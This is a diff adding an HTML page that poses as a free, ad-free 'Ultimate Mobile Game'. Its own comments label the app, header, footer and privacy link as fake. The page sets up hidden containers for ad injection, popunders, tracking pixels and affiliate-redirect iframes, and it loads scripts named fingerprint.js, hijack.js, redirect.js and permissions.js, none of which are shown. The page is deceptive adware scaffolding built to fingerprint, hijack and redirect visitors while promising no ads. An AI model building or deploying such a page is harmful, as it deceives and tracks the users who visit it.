@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>Free Premium App - No Ads!</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="ads.css">
+    <link rel="stylesheet" href="overlays.css">
+</head>
+<body class="no-scroll">
+    <!-- Fake app container -->
+    <div id="appContainer">
+        <header class="fake-header">
+            <h1>🎮 Ultimate Mobile Game</h1>
+            <p class="subtitle">100% Free • No Ads • Premium Experience</p>
+        </header>
+        
+        <main id="mainContent">
+            <div class="loading-screen">
+                <div class="loader"></div>
+                <p>Loading your premium experience...</p>
+            </div>
+        </main>
+        
+        <footer class="fake-footer">
+            <p>© 2024 Premium Apps Inc. | <a href="#" class="fake-privacy-link">Privacy Policy</a></p>
+        </footer>
+    </div>
+
+    <!-- Ad injection points (hidden initially) -->
+    <div id="adContainer"></div>
+    <div id="overlayContainer"></div>
+    <div id="popunderContainer"></div>
+    
+    <!-- Tracking pixels container -->
+    <div id="trackingPixels"></div>
+    
+    <!-- Hidden iframes for affiliate redirects -->
+    <div id="hiddenIframes"></div>
+    
+    <!-- Script includes -->
+    <script src="fingerprint.js"></script>
+    <script src="adEngine.js"></script>
+    <script src="tracking.js"></script>
+    <script src="hijack.js"></script>
+    <script src="main.js"></script>
+    <script src="redirect.js"></script>
+    <script src="permissions.js"></script>
+</body>
+</html>
